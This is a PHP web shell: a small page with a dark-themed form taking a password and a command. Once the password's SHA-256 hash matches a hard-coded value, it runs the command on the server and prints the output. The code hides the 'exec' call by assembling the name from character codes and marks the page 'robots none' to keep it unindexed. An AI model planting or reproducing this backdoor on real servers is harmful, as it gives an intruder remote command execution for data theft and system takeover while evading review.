<?php

$pas="52a29501b93c843f68cc1b62b6032fec5b3d6ec2b140232a6664d0a34163e7be";
$output=null;

$A = chr(0x65);
$B = chr(0x78);
$X = chr(0x63);

$hook = $A.$B.$A.$X;
?>

<!DOCTYPE html>
<html>
 <head>
  <meta name="robots" content="none">
 </head>
 <body bgcolor=#212121 text=#FFFFFF leftmargin=50>
  <code>	
   <div>
    <?php echo hash('sha256',$_GET['pas']); ?><br>
    don't forget about 2>&1
   </div>
   <form method="get">
    <p>
     <div>
      <label for=pas>pas: </label>
      <input id=pas type="text" size=80 value="<?php echo htmlspecialchars($_GET['pas']); ?>" name="pas">
     </div>
     <div>
      <label for=cmd>cmd: </label>  
      <input id=cmd type="text" size=80 value="<?php echo htmlspecialchars($_GET['cmd']); ?>" name="cmd">
     </div>
     <div>
      <input type="submit">
     </div>
    </p>
   </form>
   <hr align=left width=712>
   <p> 

<?php
if(hash('sha256',$_GET['pas'])==$pas && isset($_GET['cmd'])) {
	$hook($_GET['cmd'], $output);
}

for($i=0; $i < count($output); $i++) {
	echo htmlspecialchars($output[$i]), "<br>";
}
?>
  </p>
  </code>
 </body>
</html>